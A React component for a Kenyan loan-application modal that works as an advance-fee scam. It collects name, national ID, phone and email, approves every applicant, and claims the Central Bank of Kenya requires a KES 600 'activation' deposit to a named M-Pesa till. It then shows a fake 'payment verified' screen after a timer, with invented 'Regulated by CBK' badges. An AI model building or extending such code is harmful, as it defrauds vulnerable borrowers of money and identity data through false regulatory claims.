import React, { useState } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { X, CheckCircle2, AlertCircle, Smartphone, Loader2, ArrowRight, ChevronLeft, Copy, Check } from 'lucide-react';

interface LoanApplicationModalProps {
  isOpen: boolean;
  onClose: () => void;
}

type Step = 'registration' | 'verification' | 'result';

export const LoanApplicationModal: React.FC<LoanApplicationModalProps> = ({ isOpen, onClose }) => {
  const [step, setStep] = useState<Step>('registration');
  const [loading, setLoading] = useState(false);
  const [formData, setFormData] = useState({
    fullName: '',
    idNumber: '',
    phoneNumber: '',
    email: '',
  });
  const [verificationData, setVerificationData] = useState({
    isEmployed: false,
    salaryRange: '',
    loanPurpose: '',
    loanAmount: 0,
  });
  const [creditScore, setCreditScore] = useState(300);
  const [qualified, setQualified] = useState<boolean | null>(null);
  const [mpesaStatus, setMpesaStatus] = useState<'idle' | 'pending' | 'success'>('idle');
  const [copied, setCopied] = useState(false);
  const [mpesaMessage, setMpesaMessage] = useState('');
  const [verifyingPayment, setVerifyingPayment] = useState(false);
  const [paymentVerified, setPaymentVerified] = useState(false);
  const [verificationError, setVerificationError] = useState('');

  const handleCopyTill = () => {
    navigator.clipboard.writeText('9244820');
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const handleVerifyPayment = (e: React.FormEvent) => {
    e.preventDefault();
    if (!mpesaMessage.trim()) {
      setVerificationError('Please paste your M-Pesa confirmation message first.');
      return;
    }
    setVerificationError('');
    setVerifyingPayment(true);
    
    setTimeout(() => {
      setVerifyingPayment(false);
      setPaymentVerified(true);
    }, 2500);
  };

  const handleRegistrationSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setTimeout(() => {
      setLoading(false);
      setStep('verification');
    }, 1000);
  };

  const calculateCreditScore = (data: typeof verificationData) => {
    let score = 300; // Base score
    if (data.isEmployed) score += 200;
    
    if (data.salaryRange === '0-20k') score += 100;
    else if (data.salaryRange === '20k-50k') score += 250;
    else if (data.salaryRange === '50k+') score += 400;

    if (data.loanPurpose === 'Emergency') score += 50;
    else if (data.loanPurpose === 'Business') score += 150;
    else if (data.loanPurpose === 'Education') score += 100;

    setCreditScore(score);
  };

  const updateVerificationData = (updates: Partial<typeof verificationData>) => {
    const newData = { ...verificationData, ...updates };
    setVerificationData(newData);
    calculateCreditScore(newData);
  };

  const handleVerificationSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (verificationData.loanAmount === 0) return;
    
    setLoading(true);
    setTimeout(() => {
      setLoading(false);
      setQualified(true);
      setStep('result');
    }, 1500);
  };

  const triggerMpesa = async () => {
    setMpesaStatus('pending');
    try {
      const response = await fetch('/api/mpesa/stk-push', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          phoneNumber: formData.phoneNumber,
          amount: 150
        })
      });
      
      const data = await response.json();
      
      if (data.ResponseCode === '0') {
        // STK Push initiated successfully
        // In a real app, we would poll for the callback result
        // For this demo, we'll simulate success after a delay
        setTimeout(() => {
          setMpesaStatus('success');
        }, 5000);
      } else {
        throw new Error(data.CustomerMessage || 'Failed to initiate M-Pesa payment');
      }
    } catch (error) {
      console.error('Payment Error:', error);
      alert(error instanceof Error ? error.message : 'Payment failed. Please try again.');
      setMpesaStatus('idle');
    }
  };

  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 z-[100] flex items-center justify-center p-4">
      <motion.div 
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        exit={{ opacity: 0 }}
        onClick={onClose}
        className="absolute inset-0 bg-kenya-black/60 backdrop-blur-sm"
      />
      
      <motion.div 
        initial={{ scale: 0.9, opacity: 0, y: 20 }}
        animate={{ scale: 1, opacity: 1, y: 0 }}
        exit={{ scale: 0.9, opacity: 0, y: 20 }}
        className="bg-white w-full max-w-lg max-h-[90vh] rounded-[2.5rem] overflow-hidden shadow-2xl relative z-10 flex flex-col"
      >
        {/* Header */}
        <div className="p-8 border-b border-gray-100 flex justify-between items-center">
          <div>
            <h2 className="text-2xl font-display font-bold">Loan Application</h2>
            <p className="text-sm text-gray-500">Step {step === 'registration' ? '1' : step === 'verification' ? '2' : '3'} of 3</p>
          </div>
          <button onClick={onClose} className="p-2 hover:bg-gray-100 rounded-full transition-colors">
            <X size={24} />
          </button>
        </div>

        <div className="p-8 overflow-y-auto flex-1 custom-scrollbar">
          <AnimatePresence mode="wait">
            {step === 'registration' && (
              <motion.form 
                key="reg"
                initial={{ opacity: 0, x: 20 }}
                animate={{ opacity: 1, x: 0 }}
                exit={{ opacity: 0, x: -20 }}
                onSubmit={handleRegistrationSubmit}
                className="space-y-4"
              >
                <div className="space-y-2">
                  <label className="text-xs font-bold uppercase tracking-widest text-gray-400">Full Name</label>
                  <input 
                    required
                    type="text" 
                    className="w-full px-6 py-4 rounded-2xl bg-gray-50 border border-gray-100 focus:border-kenya-red outline-none transition-all"
                    placeholder="Enter your full name"
                    value={formData.fullName}
                    onChange={e => setFormData({...formData, fullName: e.target.value})}
                  />
                </div>
                <div className="space-y-2">
                  <label className="text-xs font-bold uppercase tracking-widest text-gray-400">ID Number</label>
                  <input 
                    required
                    type="text" 
                    className="w-full px-6 py-4 rounded-2xl bg-gray-50 border border-gray-100 focus:border-kenya-red outline-none transition-all"
                    placeholder="National ID Number"
                    value={formData.idNumber}
                    onChange={e => setFormData({...formData, idNumber: e.target.value})}
                  />
                </div>
                <div className="grid grid-cols-2 gap-4">
                  <div className="space-y-2">
                    <label className="text-xs font-bold uppercase tracking-widest text-gray-400">Phone (M-Pesa)</label>
                    <input 
                      required
                      type="tel" 
                      className="w-full px-6 py-4 rounded-2xl bg-gray-50 border border-gray-100 focus:border-kenya-red outline-none transition-all"
                      placeholder="07..."
                      value={formData.phoneNumber}
                      onChange={e => setFormData({...formData, phoneNumber: e.target.value})}
                    />
                  </div>
                  <div className="space-y-2">
                    <label className="text-xs font-bold uppercase tracking-widest text-gray-400">Email</label>
                    <input 
                      required
                      type="email" 
                      className="w-full px-6 py-4 rounded-2xl bg-gray-50 border border-gray-100 focus:border-kenya-red outline-none transition-all"
                      placeholder="Email address"
                      value={formData.email}
                      onChange={e => setFormData({...formData, email: e.target.value})}
                    />
                  </div>
                </div>
                <button 
                  disabled={loading}
                  className="w-full bg-kenya-black text-white py-5 rounded-2xl font-bold text-lg flex items-center justify-center gap-2 hover:bg-opacity-90 transition-all mt-4"
                >
                  {loading ? <Loader2 className="animate-spin" /> : <>Continue to Verification <ArrowRight size={20} /></>}
                </button>
              </motion.form>
            )}

            {step === 'verification' && (
              <motion.form 
                key="ver"
                initial={{ opacity: 0, x: 20 }}
                animate={{ opacity: 1, x: 0 }}
                exit={{ opacity: 0, x: -20 }}
                onSubmit={handleVerificationSubmit}
                className="space-y-6"
              >
                <div className="p-4 bg-kenya-green/5 rounded-2xl border border-kenya-green/10 flex gap-4 items-start">
                  <AlertCircle className="text-kenya-green shrink-0" />
                  <p className="text-sm text-gray-600">Please answer these questions truthfully to determine your credit score and eligibility.</p>
                </div>

                <div className="space-y-4">
                  <label className="flex items-center gap-4 p-4 rounded-2xl border border-gray-100 bg-gray-50 cursor-pointer hover:bg-gray-100 transition-all">
                    <input 
                      type="checkbox" 
                      className="w-6 h-6 rounded-lg border-gray-300 text-kenya-red focus:ring-kenya-red"
                      checked={verificationData.isEmployed}
                      onChange={e => updateVerificationData({ isEmployed: e.target.checked })}
                    />
                    <span className="font-medium">Are you currently employed?</span>
                  </label>

                  <div className="space-y-2">
                    <label className="text-xs font-bold uppercase tracking-widest text-gray-400">Monthly Salary Range</label>
                    <select 
                      required
                      className="w-full px-6 py-4 rounded-2xl bg-gray-50 border border-gray-100 focus:border-kenya-red outline-none transition-all"
                      value={verificationData.salaryRange}
                      onChange={e => updateVerificationData({ salaryRange: e.target.value })}
                    >
                      <option value="">Select range</option>
                      <option value="0-20k">Below KES 20,000</option>
                      <option value="20k-50k">KES 20,000 - 50,000</option>
                      <option value="50k+">Above KES 50,000</option>
                    </select>
                  </div>

                  <div className="space-y-2">
                    <label className="text-xs font-bold uppercase tracking-widest text-gray-400">Purpose of Loan</label>
                    <select 
                      required
                      className="w-full px-6 py-4 rounded-2xl bg-gray-50 border border-gray-100 focus:border-kenya-red outline-none transition-all"
                      value={verificationData.loanPurpose}
                      onChange={e => updateVerificationData({ loanPurpose: e.target.value })}
                    >
                      <option value="">Select purpose</option>
                      <option value="Emergency">Emergency</option>
                      <option value="Business">Business Scaling</option>
                      <option value="Education">Education/Skills</option>
                      <option value="Personal">Personal Use</option>
                    </select>
                  </div>

                  <div className="space-y-4 pt-2">
                    <div className="flex justify-between items-end">
                      <label className="text-xs font-bold uppercase tracking-widest text-gray-400">Select Loan Amount</label>
                      <div className="text-right">
                        <span className="text-[10px] text-gray-400 uppercase font-bold">Credit Score</span>
                        <div className="text-lg font-black text-kenya-green leading-none">{creditScore}</div>
                      </div>
                    </div>
                    
                    <div className="space-y-3">
                      <div className="grid grid-cols-1 gap-3">
                        {[
                          { label: 'KES 1,000 - 5,000', minScore: 350, value: 2500 },
                          { label: 'KES 5,000 - 10,000', minScore: 400, value: 7500 },
                          { label: 'KES 10,000 - 20,000', minScore: 550, value: 15000 },
                          { label: 'KES 20,000 - 35,000', minScore: 700, value: 27500 },
                          { label: 'KES 35,000 - 50,000', minScore: 850, value: 45000 },
                          { label: 'KES 50,000 - 75,000', minScore: 950, value: 65000 },
                          { label: 'KES 75,000 - 100,000', minScore: 1100, value: 90000 },
                        ].map((option) => {
                          const isLocked = creditScore < option.minScore;
                          return (
                            <button
                              key={option.label}
                              type="button"
                              disabled={isLocked}
                              onClick={() => updateVerificationData({ loanAmount: option.value })}
                              className={`relative p-4 rounded-2xl border-2 transition-all flex items-center justify-between ${
                                verificationData.loanAmount === option.value 
                                  ? 'border-kenya-red bg-kenya-red/5' 
                                  : isLocked 
                                    ? 'border-gray-100 bg-gray-50 opacity-50 cursor-not-allowed' 
                                    : 'border-gray-100 bg-white hover:border-gray-200'
                              }`}
                            >
                              <span className={`font-bold ${verificationData.loanAmount === option.value ? 'text-kenya-red' : 'text-gray-700'}`}>
                                {option.label}
                              </span>
                              {isLocked ? (
                                <span className="text-[10px] font-bold text-gray-400 uppercase">Locked (Need {option.minScore}+)</span>
                              ) : (
                                <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center ${
                                  verificationData.loanAmount === option.value ? 'border-kenya-red bg-kenya-red' : 'border-gray-300'
                                }`}>
                                  {verificationData.loanAmount === option.value && <div className="w-2 h-2 bg-white rounded-full" />}
                                </div>
                              )}
                            </button>
                          );
                        })}
                      </div>
                    </div>
                  </div>
                </div>

                <div className="flex gap-4">
                  <button 
                    type="button"
                    onClick={() => setStep('registration')}
                    className="flex-1 bg-gray-100 text-gray-600 py-5 rounded-2xl font-bold flex items-center justify-center gap-2 hover:bg-gray-200 transition-all"
                  >
                    <ChevronLeft size={20} /> Back
                  </button>
                  <button 
                    disabled={loading || verificationData.loanAmount === 0}
                    className="flex-[2] bg-kenya-red text-white py-5 rounded-2xl font-bold flex items-center justify-center gap-2 hover:bg-opacity-90 transition-all disabled:opacity-50"
                  >
                    {loading ? <Loader2 className="animate-spin" /> : 'Apply Now'}
                  </button>
                </div>
              </motion.form>
            )}

            {step === 'result' && (
              <motion.div 
                key="res"
                initial={{ opacity: 0, scale: 0.9 }}
                animate={{ opacity: 1, scale: 1 }}
                className="text-center py-4"
              >
                {qualified ? (
                  paymentVerified ? (
                    <div className="space-y-6 py-4 text-center">
                      <div className="w-20 h-20 bg-kenya-green/10 text-kenya-green rounded-full flex items-center justify-center mx-auto">
                        <CheckCircle2 size={48} />
                      </div>
                      <div>
                        <h3 className="text-3xl font-display font-bold text-kenya-green mb-2">Account Activated!</h3>
                        <p className="text-sm text-gray-600 font-medium px-4">
                          Your NYOTA FUND GRANT has been successfully activated.
                        </p>
                      </div>
                      
                      <div className="p-6 bg-gray-50 rounded-[2rem] border border-gray-100 text-left space-y-4">
                        <div className="flex items-center justify-between text-sm">
                          <span className="text-gray-500">Deposit Verified:</span>
                          <span className="font-bold text-kenya-green">KES 600.00</span>
                        </div>
                        <div className="flex items-center justify-between text-sm">
                          <span className="text-gray-500">Activation Status:</span>
                          <span className="font-bold text-kenya-green flex items-center gap-1">
                            Active (Regulated by CBK)
                          </span>
                        </div>
                        <div className="h-[1px] bg-gray-200 w-full"></div>
                        <p className="text-xs text-gray-500 leading-relaxed">
                          Your grant disbursement is now active. The prompt and uninterrupted funds of <strong>KES {verificationData.loanAmount.toLocaleString()}</strong> will be sent directly to your M-Pesa account (<strong>{formData.phoneNumber || '0113995799'}</strong>) shortly. You will receive a call within 24 hours on business consultation. Thank you for your cooperation.
                        </p>
                      </div>
                      
                      <button 
                        onClick={onClose}
                        className="w-full bg-kenya-green text-white py-4 rounded-xl font-bold hover:bg-opacity-90 transition-all shadow-lg shadow-kenya-green/25"
                      >
                        Done
                      </button>
                    </div>
                  ) : (
                    <div className="space-y-6 text-left">
                      {/* Top banner / Badge */}
                      <div className="text-center pb-2">
                        <span className="px-4 py-1.5 rounded-full bg-kenya-red/10 text-kenya-red text-xs font-bold uppercase tracking-widest">
                          our Account savings Payment
                        </span>
                        <h3 className="text-2xl font-display font-bold mt-3 text-gray-900">Payment Instructions</h3>
                      </div>
                      
                      {/* Instructions Description */}
                      <div className="p-5 bg-kenya-red/5 border border-kenya-red/10 rounded-[2rem]">
                        <p className="text-[13px] text-gray-700 leading-relaxed font-semibold">
                          Activate NYOTA FUND GRANT application, the Central Bank of Kenya (CBK) requires you to deposit the amount below to activate your account for prompt and uninterrupted grant disbursement via M-Pesa (Regulated by CBK). :
                        </p>
                      </div>

                      {/* Steps List */}
                      <div className="space-y-3 bg-gray-50 p-5 rounded-[2rem] border border-gray-100">
                        <h4 className="text-xs font-bold uppercase tracking-widest text-gray-400 mb-2">M-Pesa Steps</h4>
                        <ol className="list-decimal list-inside text-sm text-gray-600 space-y-2">
                          <li>Go to <span className="font-semibold text-gray-800">M-Pesa</span> on your phone</li>
                          <li>Select <span className="font-semibold text-gray-800">"Lipa Na M-Pesa"</span></li>
                          <li>Select <span className="font-semibold text-gray-800">"Buy Goods and Services"</span></li>
                          <li>Enter Till Number: <span className="font-bold text-kenya-red bg-kenya-red/5 px-2 py-0.5 rounded">9244820</span></li>
                          <li>Enter Amount: <span className="font-bold text-gray-800 underline">KES 600</span></li>
                          <li>Enter your <span className="font-semibold text-gray-800">M-Pesa PIN</span> and confirm</li>
                          <li>Wait for confirmation message</li>
                        </ol>
                      </div>

                      {/* Payment Details Card */}
                      <div className="p-5 rounded-[2rem] border-2 border-dashed border-gray-200 bg-white space-y-4">
                        <div className="flex justify-between items-center text-xs text-gray-400 font-bold uppercase tracking-widest">
                          <span>Payment Details</span>
                          <span className="text-[10px] text-kenya-green">Secure CBK Gateway</span>
                        </div>
                        
                        <div className="space-y-2.5">
                          <div className="flex justify-between items-center">
                            <span className="text-xs text-gray-500">Business Name:</span>
                            <span className="font-bold text-sm text-gray-800">LEFRIEQUE DIVERSITY</span>
                          </div>
                          <div className="flex justify-between items-center">
                            <span className="text-xs text-gray-500">Till Number:</span>
                            <div className="flex items-center gap-2">
                              <span className="font-mono font-bold text-lg text-kenya-red">9244820</span>
                              <button 
                                type="button" 
                                onClick={handleCopyTill}
                                className="p-1.5 text-gray-400 hover:text-kenya-red bg-gray-50 hover:bg-kenya-red/5 rounded-lg transition-all"
                                title="Copy Till Number"
                              >
                                {copied ? <Check size={14} className="text-kenya-green" /> : <Copy size={14} />}
                              </button>
                            </div>
                          </div>
                          <div className="flex justify-between items-center border-t border-gray-100 pt-2">
                            <span className="text-xs text-gray-500">Amount required:</span>
                            <span className="font-black text-xl text-gray-900">KES 600</span>
                          </div>
                        </div>

                        <button 
                          type="button" 
                          onClick={handleCopyTill}
                          className="w-full flex items-center justify-center gap-2 py-3.5 rounded-xl bg-gray-50 font-bold text-xs text-gray-600 hover:bg-gray-100 transition-all border border-gray-100"
                        >
                          {copied ? (
                            <>
                              <CheckCircle2 size={14} className="text-kenya-green animate-bounce" />
                              <span>Till Number Copied!</span>
                            </>
                          ) : (
                            <>
                              <Copy size={14} />
                              <span>Copy Till Number (9244820)</span>
                            </>
                          )}
                        </button>
                      </div>

                      {/* Verification form */}
                      <div className="space-y-4 pt-2">
                        <div className="space-y-2">
                          <div className="flex flex-col">
                            <span className="text-base font-bold text-gray-900">M-Pesa Verification</span>
                            <p className="text-[11px] text-gray-500 font-medium">
                              After making the payment, please paste the M-Pesa confirmation message below for verification:
                            </p>
                          </div>
                          
                          <label className="block text-xs font-bold uppercase tracking-widest text-gray-400 mt-2">
                            M-Pesa Confirmation Message
                          </label>
                          <textarea 
                            required
                            rows={3}
                            className="w-full px-5 py-3 rounded-xl bg-gray-50 border border-gray-100 focus:border-kenya-red outline-none text-xs font-mono transition-all resize-none"
                            placeholder="Paste the entire M-Pesa confirmation message here..."
                            value={mpesaMessage}
                            onChange={(e) => {
                              setMpesaMessage(e.target.value);
                              if (verificationError) setVerificationError('');
                            }}
                          />
                        </div>

                        {verificationError && (
                          <div className="p-3.5 bg-kenya-red/5 border border-kenya-red/10 text-kenya-red rounded-xl text-xs flex gap-2 items-start font-medium animate-pulse">
                            <AlertCircle size={16} className="shrink-0 mt-0.5" />
                            <span>{verificationError}</span>
                          </div>
                        )}

                        <button 
                          type="button"
                          onClick={handleVerifyPayment}
                          disabled={verifyingPayment}
                          className="w-full bg-kenya-red text-white py-5 rounded-2xl font-bold text-lg flex items-center justify-center gap-2 hover:bg-opacity-90 transition-all disabled:opacity-50 shadow-lg shadow-kenya-red/10"
                        >
                          {verifyingPayment ? (
                            <>
                              <Loader2 className="animate-spin" size={20} />
                              <span>Verifying Payment...</span>
                            </>
                          ) : (
                            <span>Verify Payment</span>
                          )}
                        </button>
                      </div>
                    </div>
                  )
                ) : (
                  <div className="space-y-6">
                    <div className="w-20 h-20 bg-kenya-red/10 text-kenya-red rounded-full flex items-center justify-center mx-auto">
                      <X size={48} />
                    </div>
                    <div>
                      <h3 className="text-3xl font-display font-bold text-kenya-red mb-2">Application Declined</h3>
                      <p className="text-gray-600">Unfortunately, your current credit score does not meet our minimum requirements at this time.</p>
                    </div>
                    <p className="text-sm text-gray-400">We recommend building your savings through the Haba Haba scheme and reapplying in 30 days.</p>
                    <button 
                      onClick={onClose}
                      className="w-full bg-gray-100 text-gray-600 py-4 rounded-xl font-bold hover:bg-gray-200 transition-all"
                    >
                      Close
                    </button>
                  </div>
                )}
              </motion.div>
            )}
          </AnimatePresence>
        </div>
      </motion.div>
    </div>
  );
};
